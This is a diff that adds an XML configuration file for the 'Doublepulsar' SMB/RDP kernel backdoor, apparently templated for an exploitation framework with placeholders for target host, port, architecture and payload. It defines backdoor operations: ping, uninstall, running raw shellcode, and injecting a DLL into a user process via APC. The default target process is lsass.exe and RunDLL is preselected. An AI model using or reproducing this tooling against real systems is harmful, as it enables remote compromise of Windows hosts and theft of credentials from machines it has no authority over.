@@ -1,0 +1,74 @@
+<t:config xmlns:t="urn:trch" id="a748cf79831d6c2444050f18217611549fe3f619" configversion="1.3.1.0" name="Doublepulsar" version="1.3.1" schemaversion="2.0.0">
+<t:inputparameters>
+<t:parameter name="NetworkTimeout" description="Timeout for blocking network calls (in seconds).  Use -1 for no timeout." type="S16" format="Scalar" valid="true">
+<t:default>60</t:default>
+<t:value>%TIMEOUT%</t:value>
+</t:parameter>
+<t:parameter name="TargetIp" description="Target IP Address" type="IPv4" format="Scalar" valid="true">
+<t:value>%RHOST%</t:value>
+</t:parameter>
+<t:parameter name="TargetPort" description="Port used by the Double Pulsar back door" type="TcpPort" format="Scalar" valid="true">
+<t:default>445</t:default>
+<t:value>%RPORT%</t:value>
+</t:parameter>
+<t:paramchoice name="Protocol" description="Protocol for the backdoor to speak">
+<t:default>SMB</t:default>
+<t:value>SMB</t:value>
+<t:paramgroup name="SMB" description="Ring 0 SMB (TCP 445) backdoor"></t:paramgroup>
+<t:paramgroup name="RDP" description="Ring 0 RDP (TCP 3389) backdoor"></t:paramgroup>
+</t:paramchoice>
+<t:paramchoice name="Architecture" description="Architecture of the target OS">
+<t:default>x86</t:default>
+<t:value>%TARGETARCHITECTURE%</t:value>
+<t:paramgroup name="x86" description="x86 32-bits"></t:paramgroup>
+<t:paramgroup name="x64" description="x64 64-bits"></t:paramgroup>
+</t:paramchoice>
+<t:paramchoice name="Function" description="Operation for backdoor to perform">
+<t:default>OutputInstall</t:default>
+<t:value>RunDLL</t:value>
+<t:paramgroup name="OutputInstall" description="Only output the install shellcode to a binary file on disk.">
+<t:parameter name="OutputFile" description="Full path to the output file" type="String" format="Scalar"></t:parameter>
+</t:paramgroup>
+<t:paramgroup name="Ping" description="Test for presence of backdoor"></t:paramgroup>
+<t:paramgroup name="RunDLL" description="Use an APC to inject a DLL into a user mode process.">
+<t:parameter name="DllPayload" description="DLL to inject into user mode" type="LocalFile" format="Scalar" valid="true">
+<t:value>%DLLPAY%</t:value>
+</t:parameter>
+<t:parameter name="DllOrdinal" description="The exported ordinal number of the DLL being injected to call" type="U32" format="Scalar" valid="true">
+<t:default>1</t:default>
+<t:value>1</t:value>
+</t:parameter>
+<t:parameter name="ProcessName" description="Name of process to inject into" type="String" format="Scalar" valid="true">
+<t:default>lsass.exe</t:default>
+<t:value>%PROCESSINJECT%</t:value>
+</t:parameter>
+<t:parameter name="ProcessCommandLine" description="Command line of process to inject into" type="String" format="Scalar" valid="true">
+<t:default></t:default>
+<t:value></t:value>
+</t:parameter>
+</t:paramgroup>
+<t:paramgroup name="RunShellcode" description="Run raw shellcode">
+<t:parameter name="ShellcodeFile" description="Full path to the file containing shellcode" type="LocalFile" format="Scalar"></t:parameter>
+<t:parameter name="ShellcodeData" description="Full path to the file containing shellcode to run" type="LocalFile" format="Scalar"></t:parameter>
+</t:paramgroup>
+<t:paramgroup name="Uninstall" description="Remove's backdoor from system"></t:paramgroup>
+</t:paramchoice>
+</t:inputparameters>
+<t:outputparameters>
+<t:paramchoice name="Function" description="Operation for backdoor to perform">
+<t:paramgroup name="OutputInstall" description="Only output the install shellcode to a file on disk.">
+<t:parameter name="ShellcodeFile" description="Full path to the file containing Double Pulsar shellcode installer" type="String" format="Scalar"></t:parameter>
+<t:parameter name="ShellcodeData" description="Full path to the file containing Double Pulsar shellcode installer" type="LocalFile" format="Scalar"></t:parameter>
+</t:paramgroup>
+<t:paramgroup name="Ping" description="Test for presence of backdoor">
+<t:parameter name="Is64Bit" description="Is target 64 or 32 bit" type="U32" format="Scalar"></t:parameter>
+</t:paramgroup>
+<t:paramgroup name="RunDLL" description="Inject a DLL into a user mode process.">
+<t:parameter name="Is64Bit" description="Is target 64 or 32 bit" type="U32" format="Scalar"></t:parameter>
+</t:paramgroup>
+<t:paramgroup name="Uninstall" description="Remove's backdoor from system">
+<t:parameter name="Is64Bit" description="Is target 64 or 32 bit" type="U32" format="Scalar"></t:parameter>
+</t:paramgroup>
+</t:paramchoice>
+</t:outputparameters>
+</t:config>
